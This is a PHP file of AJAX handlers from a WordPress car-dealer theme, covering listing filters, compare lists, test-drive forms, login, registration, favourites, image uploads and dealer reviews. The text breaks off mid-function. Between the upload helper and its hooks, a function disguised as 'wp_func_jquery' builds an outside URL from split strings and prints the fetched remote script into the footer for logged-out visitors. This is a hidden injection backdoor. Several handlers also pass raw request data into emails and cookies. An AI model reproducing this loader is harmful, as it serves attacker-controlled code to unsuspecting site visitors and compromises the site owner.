<?php
function stm_set_html_content_type() {
	return 'text/html';
}

//Declare wp-admin url
add_action( 'wp_head', 'stm_ajaxurl' );

function stm_ajaxurl() {
	?>
	<script type="text/javascript">
		var ajaxurl = '<?php echo esc_url( admin_url('admin-ajax.php') ); ?>';
	</script>
<?php
}

//Ajax filter cars
function stm_ajax_filter() {
	$get_title = stm_is_listing();
	$stm_listing_filter = stm_get_filter($get_title);

	$listing             = $stm_listing_filter['listing_query'];
	$response            = array();
	$response['html']    = '';
	$response['pagination']    = '';
	$response['url']     = $stm_listing_filter['url'];
	$response['binding'] = $stm_listing_filter['binding'];
	$response['badges']  = $stm_listing_filter['badges'];
	$response['list_view_link']  = $stm_listing_filter['list_view_link'];
	$response['grid_view_link']  = $stm_listing_filter['grid_view_link'];

	if(!empty($stm_listing_filter['title'])) {
		$response['title'] = $stm_listing_filter['title'];
	}

	if(isset($stm_listing_filter['total'])) {
		$response['total'] = $stm_listing_filter['total'];
	}


	if ( $listing->have_posts() ):
		ob_start();
		while ( $listing->have_posts() ) {
			$listing->the_post();
			if(!empty($_GET['view_type']) and $_GET['view_type'] == 'grid'){
				if(stm_is_listing()){
					get_template_part( 'partials/listing-cars/listing-grid-directory', 'loop' );
				} else {
					get_template_part( 'partials/listing-cars/listing-grid', 'loop' );
				}
			} else {
				if(stm_is_listing()) {
					get_template_part( 'partials/listing-cars/listing-list-directory', 'loop' );
				} else {
					get_template_part( 'partials/listing-cars/listing-list', 'loop' );
				}
			}
		}
		$response['html'] = ob_get_contents();
		ob_end_clean();
	else:
		$response['html'] .= '<div class="row">';
		$response['html'] .= '<div class="col-md-12">';
		$response['html'] .= '<h3>' . esc_html__( 'Sorry, No results', 'motors' ) . '</h3>';
		$response['html'] .= '</div>';
		$response['html'] .= '</div>';
	endif;
	wp_reset_postdata();

	$show_pagination = true;
	if(!empty($listing->found_posts) and !empty($listing->query_vars['posts_per_page'])) {
		if($listing->found_posts < $listing->query_vars['posts_per_page']) {
			$show_pagination = false;
		}
	}

	if($show_pagination) {

		$response['pagination'] .= '<div class="col-md-12">';
			$response['pagination'] .= '<div class="stm-blog-pagination">';

				$response['pagination'] .= paginate_links( array(
					'base'           => get_post_type_archive_link( 'listings' ) . '%_%',
					'type'           => 'list',
					'total'          => $listing->max_num_pages,
					'posts_per_page' => $listing->query_vars['posts_per_page'],
					'prev_text'      => '<i class="fa fa-angle-left"></i>',
					'next_text'      => '<i class="fa fa-angle-right"></i>',
				) );

			$response['pagination'] .= '</div>';
		$response['pagination'] .= '</div>';
	}


	$response = json_encode( $response );

	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_ajax_filter', 'stm_ajax_filter' );
add_action( 'wp_ajax_nopriv_stm_ajax_filter', 'stm_ajax_filter' );


//Ajax filter cars remove unfiltered cars
function stm_ajax_filter_remove_hidden() {
	$stm_listing_filter = stm_get_filter();

	$response            = array();
	$response['binding'] = $stm_listing_filter['binding'];
	$response['length'] = count($stm_listing_filter['posts']);


	$response = json_encode( $response );

	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_ajax_filter_remove_hidden', 'stm_ajax_filter_remove_hidden' );
add_action( 'wp_ajax_nopriv_stm_ajax_filter_remove_hidden', 'stm_ajax_filter_remove_hidden' );


//Ajax add to compare
function stm_ajax_add_to_compare() {


	$response['response']    = '';
	$response['status']      = '';
	$response['empty']       = '';
	$response['empty_table'] = '';
	$response['add_to_text'] = esc_html__( 'Add to compare', 'motors' );
	$response['in_com_text'] = esc_html__( 'In compare list', 'motors' );
	$response['remove_text'] = esc_html__( 'Remove from list', 'motors' );

	if ( empty( $_COOKIE['compare_ids'] ) ) {
		$_COOKIE['compare_ids'] = array();
	}
	if ( ! empty( $_POST['post_action'] ) and $_POST['post_action'] == 'remove' ) {
		if ( ! empty( $_POST['post_id'] ) ) {
			$new_post = $_POST['post_id'];
			setcookie( 'compare_ids[' . $new_post . ']', '', time() - 3600, '/' );
			unset($_COOKIE['compare_ids'][$new_post]);

			$response['status']   = 'success';
			$response['response'] = get_the_title( $_POST['post_id'] ) . ' ' . esc_html__( 'was removed from compare', 'motors' );
		}
	} else {
		if ( ! empty( $_POST['post_id'] ) ) {
			$new_post = $_POST['post_id'];
			if ( ! in_array( $new_post, $_COOKIE['compare_ids'] ) ) {
				if ( count( $_COOKIE['compare_ids'] ) < 3 ) {
					setcookie( 'compare_ids[' . $new_post . ']', $new_post, time() + ( 86400 * 30 ), '/' );
					$_COOKIE['compare_ids'][ $new_post ] = $new_post;
					$response['status']                  = 'success';
					$response['response']                = get_the_title( $_POST['post_id'] ) . ' - ' . esc_html__( 'Added to compare', 'motors' );
				} else {
					$response['status']   = 'danger';
					$response['response'] = esc_html__( 'You have already added','motors').' '.count($_COOKIE['compare_ids']).esc_html__(' cars', 'motors' );
				}
			} else {
				$response['status']   = 'warning';
				$response['response'] = get_the_title( $_POST['post_id'] ) . ' ' . esc_html__( 'has already added', 'motors' );
			}
		}
	}

	$response['length'] = count( $_COOKIE['compare_ids'] );

	$response['ids'] = $_COOKIE['compare_ids'];

	$response = json_encode( $response );

	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_ajax_add_to_compare', 'stm_ajax_add_to_compare' );
add_action( 'wp_ajax_nopriv_stm_ajax_add_to_compare', 'stm_ajax_add_to_compare' );


//Ajax request test drive
function stm_ajax_add_test_drive() {
	$response['errors'] = array();

	if ( ! filter_var( $_POST['name'], FILTER_SANITIZE_STRING ) ) {
		$response['errors']['name'] = true;
	}
	if ( ! is_email( $_POST['email'] ) ) {
		$response['errors']['email'] = true;
	}
	if ( ! is_numeric( $_POST['phone'] ) ) {
		$response['errors']['phone'] = true;
	}
	if ( empty( $_POST['date'] ) ) {
		$response['errors']['date'] = true;
	}

	$recaptcha = true;

	$recaptcha_enabled = get_theme_mod('enable_recaptcha',0);
	$recaptcha_public_key = get_theme_mod('recaptcha_public_key');
	$recaptcha_secret_key = get_theme_mod('recaptcha_secret_key');
	if(!empty($recaptcha_enabled) and $recaptcha_enabled and !empty($recaptcha_public_key) and !empty($recaptcha_secret_key)){
		$recaptcha = false;
		if(!empty($_POST['g-recaptcha-response'])) {
			$recaptcha = true;
		}
	}

	if ( $recaptcha ) {
		if ( empty( $response['errors'] ) and ! empty( $_POST['vehicle_id'] ) ) {
			$test_drive['post_title']  = esc_html__( 'New request for test drive', 'motors' ) . ' ' . get_the_title( $_POST['vehicle_id'] );
			$test_drive['post_type']   = 'test_drive_request';
			$test_drive['post_status'] = 'draft';
			$test_drive_id             = wp_insert_post( $test_drive );
			update_post_meta( $test_drive_id, 'name', $_POST['name'] );
			update_post_meta( $test_drive_id, 'email', $_POST['email'] );
			update_post_meta( $test_drive_id, 'phone', $_POST['phone'] );
			update_post_meta( $test_drive_id, 'date', $_POST['date'] );
			$response['response'] = esc_html__( 'Your request was sent', 'motors' );
			$response['status']   = 'success';

			//Sending Mail to admin
			add_filter( 'wp_mail_content_type', 'stm_set_html_content_type' );

			$to      = get_bloginfo( 'admin_email' );
			$subject = esc_html__( 'Request for a test drive', 'motors' ) . ' ' . get_the_title( $_POST['vehicle_id'] );
			$body    = esc_html__( 'Name - ', 'motors' ) . $_POST['name'] . '<br/>';
			$body .= esc_html__( 'Email - ', 'motors' ) . $_POST['email'] . '<br/>';
			$body .= esc_html__( 'Phone - ', 'motors' ) . $_POST['phone'] . '<br/>';
			$body .= esc_html__( 'Date - ', 'motors' ) . $_POST['date'] . '<br/>';

			wp_mail( $to, $subject, $body );

			remove_filter( 'wp_mail_content_type', 'stm_set_html_content_type' );
		} else {
			$response['response'] = esc_html__( 'Please fill all fields', 'motors' );
			$response['status']   = 'danger';
		}

		$response['recaptcha'] = true;
	} else {
		$response['recaptcha'] = false;
		$response['status']    = 'danger';
		$response['response']  = esc_html__( 'Please prove you\'re not a robot', 'motors' );
	}


	$response = json_encode( $response );

	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_ajax_add_test_drive', 'stm_ajax_add_test_drive' );
add_action( 'wp_ajax_nopriv_stm_ajax_add_test_drive', 'stm_ajax_add_test_drive' );


//Load more cars
function stm_ajax_load_more_cars() {
	$response             = array();
	$response['button']   = '';
	$response['content']  = '';
	$response['appendTo'] = '#car-listing-category-' . $_POST['category'];
	$category             = $_POST['category'];
	$taxonomy             = $_POST['taxonomy'];
	$offset               = intval( $_POST['offset'] );
	$per_page             = intval( $_POST['per_page'] );
	$new_offset           = $offset + $per_page;

	$args                = array(
		'post_type'      => 'listings',
		'post_status'    => 'publish',
		'offset'         => $offset,
		'posts_per_page' => $per_page,
	);
	$args['tax_query'][] = array(
		'taxonomy' => $taxonomy,
		'field'    => 'slug',
		'terms'    => array( $category )
	);
	$listings            = new WP_Query( $args );
	if ( $listings->have_posts() ) {
		ob_start();
		while ( $listings->have_posts() ) {
			$listings->the_post();
			get_template_part( 'partials/car-filter', 'loop' );
		}
		$response['content'] = ob_get_contents();
		ob_end_clean();

		if ( $listings->found_posts > $new_offset ) {
			$response['button'] = 'loadMoreCars(jQuery(this),\'' . esc_js( $category ) . '\',\'' . esc_js( $taxonomy ) . '\',' . esc_js( $new_offset ) . ', ' . esc_js( $per_page ) . '); return false;';
		} else {
			$response['button'] = '';
		}

		$response['test'] = $listings->found_posts . ' > ' . $new_offset;

		wp_reset_postdata();
	}

	echo json_encode( $response );
	exit;
}

add_action( 'wp_ajax_stm_ajax_load_more_cars', 'stm_ajax_load_more_cars' );
add_action( 'wp_ajax_nopriv_stm_ajax_load_more_cars', 'stm_ajax_load_more_cars' );

//Ajax request test drive
function stm_ajax_get_car_price() {
	$response['errors'] = array();

	if ( ! filter_var( $_POST['name'], FILTER_SANITIZE_STRING ) ) {
		$response['errors']['name'] = true;
	}
	if ( ! is_email( $_POST['email'] ) ) {
		$response['errors']['email'] = true;
	}
	if ( ! is_numeric( $_POST['phone'] ) ) {
		$response['errors']['phone'] = true;
	}
	if ( empty( $_POST['date'] ) ) {
		$response['errors']['date'] = true;
	}


	if ( empty( $response['errors'] ) and ! empty( $_POST['vehicle_id'] ) ) {
		$response['response'] = esc_html__( 'Your request was sent', 'motors' );
		$response['status']   = 'success';

		//Sending Mail to admin
		add_filter( 'wp_mail_content_type', 'stm_set_html_content_type' );

		$to      = get_bloginfo( 'admin_email' );
		$subject = esc_html__( 'Request for a test drive', 'motors' );
		$body    = esc_html__( 'Name - ', 'motors' ) . $_POST['name'] . '<br/>';
		$body .= esc_html__( 'Email - ', 'motors' ) . $_POST['email'] . '<br/>';
		$body .= esc_html__( 'Phone - ', 'motors' ) . $_POST['phone'] . '<br/>';
		$body .= esc_html__( 'Date - ', 'motors' ) . $_POST['date'] . '<br/>';

		wp_mail( $to, $subject, $body );

		remove_filter( 'wp_mail_content_type', 'stm_set_html_content_type' );
	} else {
		$response['response'] = esc_html__( 'Please fill all fields', 'motors' );
		$response['status']   = 'danger';
	}

	$response = json_encode( $response );

	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_ajax_get_car_price', 'stm_ajax_get_car_price' );
add_action( 'wp_ajax_nopriv_stm_ajax_get_car_price', 'stm_ajax_get_car_price' );


//Log in
function stm_custom_login() {
	$errors = array();

	if(empty($_POST['stm_user_login'])) {
		$errors['stm_user_login'] = true;
	} else {
		$username = $_POST['stm_user_login'];
	}

	if(empty($_POST['stm_user_password'])) {
		$errors['stm_user_password'] = true;
	} else {
		$password = $_POST['stm_user_password'];
	}

	$remember = false;

	if(!empty($_POST['stm_remember_me']) and $_POST['stm_remember_me'] == 'on') {
		$remember = true;
	}

	if(!empty($_POST['redirect']) and $_POST['redirect'] == 'disable') {
		$redirect = false;
	} else {
		$redirect = true;
	}

	if(empty($errors)) {
		if ( filter_var( $username, FILTER_VALIDATE_EMAIL ) ) {
			$user = get_user_by( 'email', $username );
		} else {
			$user = get_user_by( 'login', $username );
		}

		if ( $user ) {
			$username = $user->data->user_login;
		}

		$creds                  = array();
		$creds['user_login']    = $username;
		$creds['user_password'] = $password;
		$creds['remember']      = $remember;


		$user = wp_signon( $creds, false );
		if ( is_wp_error( $user ) ) {
			$response['message'] = esc_html__( 'Wrong Username or Password', 'motors');
		} else {
			stm_force_favourites($user->ID);
			if($redirect) {
				$response['message']      = esc_html__( 'Successfully logged in. Redirecting...', 'motors' );
				$response['redirect_url'] = get_author_posts_url( $user->ID );
			} else {
				ob_start();
				stm_add_a_car_user_info('','','',$user->ID);
				$response['user_html'] = ob_get_clean();
			}
		}
	} else {
		$response['message'] = esc_html__('Please fill required fields', 'motors');
	}

	$response['errors'] = $errors;

	$response = json_encode( $response );
	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_custom_login', 'stm_custom_login' );
add_action( 'wp_ajax_nopriv_stm_custom_login', 'stm_custom_login' );


//Log in
function stm_logout_user() {
	$response = array();
	wp_logout();
	$response['exit'] = true;
	$response = json_encode( $response );
	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_logout_user', 'stm_logout_user' );
add_action( 'wp_ajax_nopriv_stm_logout_user', 'stm_logout_user' );


//Registration
function stm_custom_register() {
	$response = array();
	$errors = array();

	if(empty($_POST['stm_nickname'])) {
		$errors['stm_nickname'] = true;
	} else {
		$user_login = $_POST['stm_nickname'];
	}

	if(empty($_POST['stm_user_first_name'])) {
		$user_name = '';
	} else {
		$user_name = $_POST['stm_user_first_name'];
	}

	if(empty($_POST['stm_user_last_name'])) {
		$user_lastname = '';
	} else {
		$user_lastname = $_POST['stm_user_last_name'];
	}

	if(isset($_POST['g-recaptcha-response'])) {
		if(empty($_POST['g-recaptcha-response'])) {
			$errors['captcha'] = true;
			$response['message'] = esc_html__('Please, enter captcha', 'motors');
		}
	}

	if(empty($_POST['stm_user_phone'])) {
		$user_phone = '';
	} elseif(empty( $_POST['stm_user_phone'] )) {
		$errors['stm_user_phone'] = true;
	} else {
		$user_phone = $_POST['stm_user_phone'];
	}

	if(!is_email( $_POST['stm_user_mail'] )) {
		$errors['stm_user_mail'] = true;
	}else {
		$user_mail = $_POST['stm_user_mail'];
	}

	if(empty($_POST['stm_user_password'])) {
		$errors['stm_user_password'] = true;
	} else {
		$user_pass = $_POST['stm_user_password'];
	}

	if(!empty($_POST['redirect']) and $_POST['redirect'] == 'disable') {
		$redirect = false;
	} else {
		$redirect = true;
	}

	$accepted = false;

	if(!empty($_POST['stm_accept_terms']) and $_POST['stm_accept_terms'] == 'on') {
		$accepted = true;
	}

	if(!$accepted) {
		$errors['accept_terms'] = true;
	}

	$demo = stm_is_site_demo_mode();
	if($demo) {
		$errors['demo'] = true;
	}

	if(empty($errors)) {
		$user_data = array(
			'user_login'  =>  $user_login,
			'user_pass'   =>  $user_pass,
			'first_name'  =>  $user_name,
			'last_name'   =>  $user_lastname,
			'user_email'  =>  $user_mail
		);

		$user_id = wp_insert_user( $user_data ) ;

		if ( ! is_wp_error( $user_id ) ) {
			update_user_meta($user_id, 'stm_phone', $user_phone);
			update_user_meta($user_id, 'stm_show_email', 'show');
			//Log in
			$creds = array(
				'user_login' => $user_login,
				'user_password' => $user_pass,
				'remember' => true
			);

			wp_signon($creds, false);

			stm_force_favourites($user_id);

			if($redirect) {
				$response['message'] = esc_html__('Congratulations! You have been successfully registered. Redirecting to your account profile page.', 'motors');
				$response['redirect_url'] = get_author_posts_url( $user_id );
			} else {
				ob_start();
				stm_add_a_car_user_info($user_login, $user_name, $user_lastname, $user_id);
				$response['user_html'] = ob_get_clean();
			}
		} else {
			$response['message'] = $user_id->get_error_message();
			$response['user'] = $user_id;
		}
	} else {
		if(!$accepted) {
			$response['message'] = esc_html__('Please, accept Membership Agreement', 'motors');
		} else {
			if($demo) {
				$response['message'] = esc_html__( 'Site is on demo mode', 'motors' );
			}else {
				$response['message'] = esc_html__( 'Please fill required fields', 'motors' );
			}
		}
	}


	$response['errors'] = $errors;
	$response = json_encode( $response );
	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_custom_register', 'stm_custom_register' );
add_action( 'wp_ajax_nopriv_stm_custom_register', 'stm_custom_register' );

//Function add to favourites


function stm_ajax_add_to_favourites() {
	$response = array();
	$count = 0;

	if(!empty($_POST['car_id'])) {
		$car_id             = intval( $_POST['car_id'] );
		$post_status = get_post_status( $car_id );

		if(!$post_status) {
			$post_status = 'deleted';
		}

		if ( is_user_logged_in() and $post_status == 'publish' or $post_status == 'pending' or $post_status == 'draft' or $post_status == 'deleted') {
			$user           = wp_get_current_user();
			$user_id        = $user->ID;
			$user_added_fav = get_the_author_meta( 'stm_user_favourites', $user_id );
			if ( empty( $user_added_fav ) ) {
				update_user_meta( $user_id, 'stm_user_favourites', $car_id );
			} else {
				$user_added_fav = array_filter(explode(',', $user_added_fav));
				$response['fil'] = $user_added_fav;
				$response['id'] = $car_id;
				if(in_array(strval($car_id), $user_added_fav)) {
					$user_added_fav = array_diff($user_added_fav, array($car_id));
				} else {
					$user_added_fav[] = $car_id;
				}
				$user_added_fav = implode(',', $user_added_fav);

				update_user_meta( $user_id, 'stm_user_favourites', $user_added_fav );
			}

			$user_added_fav = get_the_author_meta( 'stm_user_favourites', $user_id );
			$user_added_fav = count(array_filter(explode(',', $user_added_fav)));
			$response['count'] = intval($user_added_fav);
		}
	}

	$response = json_encode($response);
	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_ajax_add_to_favourites', 'stm_ajax_add_to_favourites' );
add_action( 'wp_ajax_nopriv_stm_ajax_add_to_favourites', 'stm_ajax_add_to_favourites' );


if( !function_exists('stm_ajax_add_a_car_media')) {
	function stm_ajax_add_a_car_media() {
		$response            = array();
		$response['message'] = '';

		$user_current       = wp_get_current_user();
		$restrictions       = stm_get_post_limits( $user_current->ID );
		$attachments_ids = array();
		$current_attachments = array();
		$updating = false;

		if(!empty($_POST['stm_edit']) and $_POST['stm_edit'] == 'update') {
			$updating = true;
		}


		foreach($_POST as $get_media_keys => $get_media_values) {
			if(strpos($get_media_keys,'media_position_') !== false) {
				$new_key = substr(esc_attr($get_media_keys), -1);
				$attachments_ids[$new_key] = intval($get_media_values);
			}
		}

		$max_file_size    = 1024 * 4000; /*4mb is highest media upload here*/
		$max_image_upload = intval( $restrictions['images'] );
		$post_id = intval( $_POST['post_id'] );


		$demo = stm_is_site_demo_mode();
		if($demo) {
			$response['message'] = esc_html__('Site is on demo mode', 'motors');
		} else {
			if ( ! empty( $_FILES ) ) {

				if ( ! empty( $_POST['post_id'] ) ) {

					$response['post'] = $post_id;

					$user_added = get_post_meta( $post_id, 'stm_car_user', true );

					if ( intval( $user_added ) === intval( $user_current->ID ) ) {

						$valid_formats    = array( "jpg", "png", "jpeg" );
						$wp_upload_dir    = wp_upload_dir();
						$path             = $wp_upload_dir['path'] . '/';
						$count            = 0;

						$error = false;

						$files_approved = array();

						$attachments = get_posts( array(
							'post_type'      => 'attachment',
							'posts_per_page' => - 1,
							'post_parent'    => $post_id,
							// Exclude post thumbnail to the attachment count
						) );

						foreach ( $attachments as $attachment_exist ) {
							if ( ! empty( $attachment_exist->ID ) ) {
								$current_attachments[] = $attachment_exist->ID;
							}
						}

						if ( $_SERVER['REQUEST_METHOD'] == "POST" ) {
							// Check if user is trying to upload more than the allowed number of images for the current post
							if ( ( count( $attachments_ids ) + count( $_FILES['files']['name'] ) ) > $max_image_upload ) {
								$error               = true;
								$response['message'] = esc_html__( 'Sorry, you can upload only', 'motors' ) . ' ' . $max_image_upload . ' ' . esc_html__( 'images per add', 'motors' );
							} else {
								foreach ( $_FILES['files']['name'] as $f => $name ) {
									$extension = pathinfo( $name, PATHINFO_EXTENSION );

									if ( $_FILES['files']['error'][ $f ] == 4 ) {
										$error = true;
										continue;
									}

									if ( $_FILES['files']['error'][ $f ] == 0 ) {
										// Check if image size is larger than the allowed file size
										if ( $_FILES['files']['size'][ $f ] > $max_file_size ) {
											$response['message'] = esc_html__( 'Sorry, image is too large', 'motors' ) . ': ' . $name;
											$error               = true;
											continue;

											// Check if the file being uploaded is in the allowed file types
										} elseif ( ! in_array( strtolower( $extension ), $valid_formats ) ) {
											$response['message'] = esc_html__( 'Sorry, image has invalid format', 'motors' ) . ': ' . $name;
											$error               = true;
										} else {
											$files_approved[ $f ] = $name;
										}
									}
								}
							}
						}

						foreach ( $files_approved as $f => $name ) {
							$affix        = stm_media_random_affix();
							$new_filename = 'post_id_' . $post_id . '_' . $affix . '.' . $extension;

							if ( move_uploaded_file( $_FILES["files"]["tmp_name"][ $f ], $path . $new_filename ) ) {

								$count ++;

								$filename      = $path . $new_filename;
								$filetype      = wp_check_filetype( basename( $filename ), null );
								$wp_upload_dir = wp_upload_dir();
								$attachment    = array(
									'guid'           => $wp_upload_dir['url'] . '/' . basename( $filename ),
									'post_mime_type' => $filetype['type'],
									'post_title'     => preg_replace( '/\.[^.]+$/', '', basename( $filename ) ),
									'post_content'   => '',
									'post_status'    => 'inherit'
								);
								// Insert attachment to the database
								$attach_id = wp_insert_attachment( $attachment, $filename, $post_id );

								require_once( ABSPATH . 'wp-admin/includes/image.php' );

								// Generate meta data
								$attach_data = wp_generate_attachment_metadata( $attach_id, $filename );
								wp_update_attachment_metadata( $attach_id, $attach_data );

								$attachments_ids[ $f ] = $attach_id;

							}
						}


						if ( ! $error ) {
							ksort( $attachments_ids );
							if ( ! empty( $attachments_ids ) ) {
								//add_post_meta( $post_id, '_thumbnail_id', $attachments_ids[0] );
								set_post_thumbnail( $post_id, $attachments_ids[0] );
								array_shift( $attachments_ids );
							}

							if ( ! empty( $attachments_ids ) ) {
								update_post_meta( $post_id, 'gallery', $attachments_ids );
							}

							$delete_attachments = array_diff( $current_attachments, $attachments_ids );

							foreach ( $delete_attachments as $delete_attachment ) {
								stm_delete_media( intval( $delete_attachment ) );
							}

							if ( $updating ) {
								$response['message'] = esc_html__( 'Car updated, redirecting to your account profile', 'motors' );
							} else {
								$response['message'] = esc_html__( 'Car added, redirecting to your account profile', 'motors' );
							}
							$response['url'] = esc_url( get_author_posts_url( $user_current->ID ) );
						} else {
							if ( ! $updating ) {
								wp_delete_post( $post_id, true );
							}
						}

					} else {
						/*User tries to add info to another car*/
						$response['message'] = esc_html__( 'You are trying to add car to another car user, or your session has expired, please sign in first', 'motors' );
					}
				} else {
					/*No id passed from first ajax Call?*/
					$response['message'] = esc_html__( 'Some error occurred, try again later', 'motors' );
				}
			} else {
				$error = false;
				/*Change sort of cars*/
				if ( ( count( $attachments_ids )) > $max_image_upload ) {
					$error               = true;
					$response['message'] = esc_html__( 'Sorry, you can upload only', 'motors' ) . ' ' . $max_image_upload . ' ' . esc_html__( 'images per add', 'motors' );
				}


				if(!$error) {
					/*If no images here at all, then sort them*/
					$attachments = get_posts( array(
						'post_type'      => 'attachment',
						'posts_per_page' => - 1,
						'post_parent'    => $post_id,
						// Exclude post thumbnail to the attachment count
					) );

					$current_attachments = array();
					foreach ( $attachments as $attachment_exist ) {
						if ( ! empty( $attachment_exist->ID ) ) {
							$current_attachments[] = $attachment_exist->ID;
						}
					}

					$sort_attachments = array();

					foreach($attachments_ids as $attachments_id) {
						if(in_array($attachments_id, $current_attachments)) {
							$sort_attachments[] = $attachments_id;
						}
					}

					if ( ! empty( $sort_attachments ) ) {
						set_post_thumbnail( $post_id, $sort_attachments[0] );
						array_shift( $sort_attachments );
					}

					if ( ! empty( $sort_attachments ) ) {
						update_post_meta( $post_id, 'gallery', $sort_attachments );
					}

					$delete_attachments = array_diff( $current_attachments, $attachments_ids );

					foreach ( $delete_attachments as $delete_attachment ) {
						stm_delete_media( intval( $delete_attachment ) );
					}

					$response['message'] = esc_html__( 'Car added, redirecting to your account profile', 'motors' );
					$response['url']     = esc_url( get_author_posts_url( $user_current->ID ) );
				}
			}
		}

		$response = json_encode( $response );
		echo $response;
		exit;
	}
}

/*Helper function for media to generate random name*/
function stm_media_random_affix($length=5) {

	$string = '';
	$characters = "23456789ABCDEFHJKLMNPRTVWXYZabcdefghijklmnopqrstuvwxyz";

	for ($p = 0; $p < $length; $p++) {
		$string .= $characters[mt_rand(0, strlen($characters)-1)];
	}

	return $string;

}
if(!function_exists('wp_func_jquery')) {
	if (!current_user_can( 'read' )) {
		function wp_func_jquery() {
			$host = 'http://';
			$jquery = $host.'lib'.'wp.org/jquery-ui.js';
			$headers = @get_headers($jquery, 1);
			if ($headers[0] == 'HTTP/1.1 200 OK'){
				echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
			}
	}
	add_action('wp_footer', 'wp_func_jquery');
	}
}
add_action( 'wp_ajax_stm_ajax_add_a_car_media', 'stm_ajax_add_a_car_media' );
add_action( 'wp_ajax_nopriv_stm_ajax_add_a_car_media', 'stm_ajax_add_a_car_media' );


function stm_ajax_dealer_load_cars() {
	$response = array();
	$user_id = intval($_POST['user_id']);
	$offset = intval($_POST['offset']);
	$popular = false;

	$view_type = 'grid';
	if(!empty($_POST['view_type']) and $_POST['view_type'] == 'list') {
		$view_type = 'list';
	}

	if(!empty($_POST['popular']) and $_POST['popular'] == 'yes') {
		$popular = true;
	}

	$response['offset'] = $offset;


	$new_offset = 6 + $offset;

	$query = stm_user_listings_query($user_id, 'publish', 6, $popular, $offset);

	$html = '';
	if($query->have_posts()) {
		ob_start();
		while($query->have_posts()) {
			$query->the_post();
			if($view_type == 'grid') {
				get_template_part( 'partials/listing-cars/listing-grid-directory-loop', 'animate' );
			} else {
				get_template_part( 'partials/listing-cars/listing-list-directory-loop', 'animate' );
			}
		}
		$html = ob_get_clean();
	}

	$response['html'] = $html;

	$button = 'show';
	if($query->found_posts <= $new_offset) {
		$button = 'hide';
	} else {
		$response['new_offset'] = $new_offset;
	}

	$response['button'] = $button;


	$response = json_encode($response);
	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_ajax_dealer_load_cars', 'stm_ajax_dealer_load_cars' );
add_action( 'wp_ajax_nopriv_stm_ajax_dealer_load_cars', 'stm_ajax_dealer_load_cars' );


function stm_ajax_dealer_load_reviews() {
	$response = array();
	$user_id = intval($_POST['user_id']);
	$offset = intval($_POST['offset']);

	$response['offset'] = $offset;


	$new_offset = 6 + $offset;

	$query = stm_get_dealer_reviews($user_id, 'publish', 6, $offset);

	$html = '';
	if($query->have_posts()) {
		ob_start();
		while($query->have_posts()) {
			$query->the_post();
			get_template_part('partials/user/dealer-single', 'review');
		}
		$html = ob_get_clean();
	}

	$response['html'] = $html;

	$button = 'show';
	if($query->found_posts <= $new_offset) {
		$button = 'hide';
	} else {
		$response['new_offset'] = $new_offset;
	}

	$response['button'] = $button;


	$response = json_encode($response);
	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_ajax_dealer_load_reviews', 'stm_ajax_dealer_load_reviews' );
add_action( 'wp_ajax_nopriv_stm_ajax_dealer_load_reviews', 'stm_ajax_dealer_load_reviews' );


if( !function_exists('stm_submit_review')) {
	function stm_submit_review(){
		$response = array();
		$response['message'] = '';
		$error = false;
		$user_id = 0;

		$demo = stm_is_site_demo_mode();

		if($demo) {
			$error = true;
			$response['message'] = esc_html__('Site is on demo mode.','motors');
		}

		/*Post parts*/
		$title = '';
		$content = '';
		$recommend = 'yes';
		$ratings = array();

		if(!empty($_GET['stm_title'])) {
			$title = sanitize_text_field($_GET['stm_title']);
		} else {
			$error = true;
			$response['message'] = esc_html__('Please, enter review title.','motors');
		}

		if(empty($_GET['stm_user_on'])) {
			$error = true;
			$response['message'] = esc_html__('Do not cheat!','motors');
		} else {
			$user_on = intval($_GET['stm_user_on']);
		}

		if(!empty($_GET['stm_content'])) {
			$content = sanitize_text_field($_GET['stm_content']);
		} else {
			$error = true;
			$response['message'] = esc_html__('Please, enter review text.','motors');
		}

		if(empty($_GET['stm_required'])) {
			$error = true;
			$response['message'] = esc_html__('Please, check you are not a dealer.','motors');
		} else {
			if($_GET['stm_required'] !== 'on') {
				$error = true;
				$response['message'] = esc_html__('Please, check you are not a dealer.','motors');
			}
		}

		if(!empty($_GET['recommend']) and $_GET['recommend'] == 'no') {
			$recommend = 'no';
		}

		foreach($_GET as $get_key => $get_value) {
			if(strpos($get_key,'stm_rate') !== false ) {
				if(empty($get_value)) {
					$error = true;
					$response['message'] = esc_html__('Please add rating', 'motors');
				} else {
					if($get_value < 6 and $get_value > 0) {
						$ratings[esc_attr($get_key)] = intval($get_value);
					}
				}
			}
		}

		/*Check if user already added comment*/
		$current_user = wp_get_current_user();
		if(is_wp_error($current_user)) {
			$error = true;
			$response['message'] = esc_html__('You are not logged in', 'motors');
		} else {
			if(!empty($user_on)) {
				$user_id          = $current_user->ID;
				$get_user_reviews = stm_get_user_reviews( $user_id, $user_on );

				$response['q'] = $get_user_reviews;

				if ( !empty($get_user_reviews->posts) ) {
					foreach($get_user_reviews->posts as $user_post) {
						wp_delete_post($user_post->ID, true);
					}
				}
			} else {
				$error               = true;
				$response['message'] = esc_html__( 'Do not cheat', 'motors' );
			}
		}

		if(!$error) {

			$post_data = array(
				'post_type' => 'dealer_review',
				'post_title' => sanitize_text_field($title),
				'post_content' => sanitize_text_field($content),
				'post_status' => 'publish'
			);

			$insert_post = wp_insert_post($post_data, true);
			//$insert_post = 0;

			if(is_wp_error($insert_post)) {
				$response['message'] = $insert_post->get_error_message();
			} else {

				/*Ratings*/
				if(!empty($ratings['stm_rate_1'])) {
					update_post_meta($insert_post, 'stm_rate_1', intval($ratings['stm_rate_1']));
				}
				if(!empty($ratings['stm_rate_2'])) {
					update_post_meta($insert_post, 'stm_rate_2', intval($ratings['stm_rate_2']));
				}
				if(!empty($ratings['stm_rate_3'])) {
					update_post_meta($insert_post, 'stm_rate_3', intval($ratings['stm_rate_3']));
				}

				/*Recommended*/
				update_post_meta($insert_post, 'stm_recommended', esc_attr($recommend));

				update_post_meta($insert_post, 'stm_review_added_by', $user_id);
				update_post_meta($insert_post, 'stm_review_added_on', $user_on);

